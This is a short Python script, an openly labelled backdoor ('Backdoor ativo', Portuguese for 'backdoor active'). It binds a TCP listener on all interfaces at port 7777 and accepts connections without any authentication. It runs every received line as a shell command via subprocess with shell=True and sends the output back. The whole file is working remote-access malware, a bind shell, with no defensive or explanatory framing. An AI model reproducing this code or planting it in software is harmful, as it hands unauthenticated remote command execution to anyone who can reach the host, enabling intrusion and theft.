#!/usr/bin/env python3
import socket
import subprocess
import sys

HOST = '0.0.0.0'
PORT = 7777

def main():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((HOST, PORT))
        s.listen(1)
        while True:
            conn, addr = s.accept()
            with conn:
                conn.sendall(b'Backdoor ativo. Digite comandos:\n')
                while True:
                    data = conn.recv(1024)
                    if not data:
                        break
                    try:
                        # Para Windows, use shell=True e encoding correto
                        output = subprocess.check_output(data.decode('utf-8', errors='ignore'), shell=True)
                    except Exception as e:
                        output = str(e).encode()
                    conn.sendall(output)

if __name__ == '__main__':
    main()
